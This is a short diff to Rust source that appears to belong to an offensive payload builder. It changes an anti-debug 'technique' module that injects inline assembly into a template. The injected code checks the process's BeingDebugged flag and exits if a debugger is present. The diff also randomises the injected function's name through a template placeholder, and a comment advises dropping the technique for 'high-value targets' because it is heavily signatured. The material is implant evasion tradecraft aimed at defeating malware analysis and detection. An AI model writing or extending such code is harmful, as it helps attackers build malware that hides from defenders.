@@ -6,7 +6,9 @@ impl Technique for AntiDebugTeb {
     fn meta(&self) -> &'static TechniqueMeta { &ANTI_DEBUG_TEB_META }
 
     fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
-        let snippet = r#"fn evasion_anti_debug_teb() {
+        // The gs:[0x60] PEB walk is heavily signatured. Drop this technique
+        // for high-value targets.
+        let snippet = r#"fn {{FN_EVASION_TEB}}() {
     let being_debugged: u32;
     unsafe {
         std::arch::asm!(
@@ -18,10 +20,10 @@ impl Technique for AntiDebugTeb {
         );
     }
     if being_debugged != 0 {
-        unsafe { winapi::um::processthreadsapi::ExitProcess(0) };
+        std::process::exit(0);
     }
 }
-evasion_anti_debug_teb();"#;
+{{FN_EVASION_TEB}}();"#;
         ctx.append_replacement("{{SANDBOX}}", snippet.to_string());
         Ok(())
     }
